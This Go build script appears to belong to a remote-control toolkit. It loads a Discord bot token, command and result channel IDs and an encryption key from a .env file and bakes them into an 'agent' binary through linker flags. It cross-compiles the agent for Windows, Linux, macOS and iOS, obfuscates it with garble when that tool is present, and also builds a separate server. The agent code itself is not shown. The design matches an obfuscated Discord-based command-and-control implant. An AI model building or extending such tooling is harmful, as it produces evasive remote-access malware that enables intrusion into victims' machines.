package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"github.com/joho/godotenv"
)

type Target struct {
	GOOS   string
	GOARCH string
}

func main() {
	err := godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}

	discordToken := os.Getenv("DISCORD_TOKEN")
	commandChannelID := os.Getenv("COMMAND_CHANNEL_ID")
	resultChannelID := os.Getenv("RESULT_CHANNEL_ID")
	encryptionKey := os.Getenv("ENCRYPTION_KEY")

	if discordToken == "" || commandChannelID == "" || resultChannelID == "" || encryptionKey == "" {
		log.Fatal("Missing required environment variables in .env file")
	}

	ldflags := fmt.Sprintf(
		`-X main.Token=%s -X main.CommandChannel=%s -X main.ResultChannel=%s -X main.KeyString=%s`,
		discordToken, commandChannelID, resultChannelID, encryptionKey,
	)

	targets := []Target{
		{"windows", "amd64"},
		{"linux", "amd64"},
		{"darwin", "amd64"},
		{"ios", "arm64"},
	}

	for _, target := range targets {
		buildAgent(target, ldflags)
	}

	buildServer()
}

func buildAgent(target Target, ldflags string) {
	outputDir := "dist"
	outputName := "agent"
	if target.GOOS == "windows" {
		outputName += ".exe"
	}
	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s-%s", target.GOOS, target.GOARCH), outputName)

	log.Printf("Building agent for %s/%s...", target.GOOS, target.GOARCH)

	var cmd *exec.Cmd
	var err error

	if target.GOOS == "ios" {
		log.Println("iOS build requires a different build mode. Using standard go build.")
		cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
	} else {
		cmd, err = getBuildCommand(outputPath, ldflags, target)
		if err != nil {
			log.Printf("Skipping garble for agent: %v", err)
			cmd = exec.Command("go", "build", "-ldflags", ldflags, "-o", outputPath, "./cmd/agent")
		}
	}

	cmd.Env = append(os.Environ(), "GOOS="+target.GOOS, "GOARCH="+target.GOARCH)
	if target.GOOS == "ios" {
		cmd.Env = append(cmd.Env, "CGO_ENABLED=1")
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("Failed to build agent for %s/%s: %v\n%s", target.GOOS, target.GOARCH, err, output)
	}

	log.Printf("Successfully built agent for %s/%s at %s", target.GOOS, target.GOARCH, outputPath)
}

func buildServer() {
	outputDir := "dist"
	outputName := "server"
	if runtime.GOOS == "windows" {
		outputName += ".exe"
	}
	outputPath := filepath.Join(outputDir, outputName)

	log.Println("Building server...")

	cmd := exec.Command("go", "build", "-o", outputPath, "./cmd/server")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("Failed to build server: %v\n%s", err, output)
	}

	log.Printf("Successfully built server at %s", outputPath)
}

func getBuildCommand(outputPath, ldflags string, target Target) (*exec.Cmd, error) {
	if target.GOOS == "ios" {
		return nil, fmt.Errorf("garble not supported for iOS")
	}
	garblePath, err := exec.LookPath("garble")
	if err != nil {
		return nil, err
	}

	return exec.Command(garblePath, "build", "-o", outputPath, "-ldflags", ldflags, "./cmd/agent"), nil
}
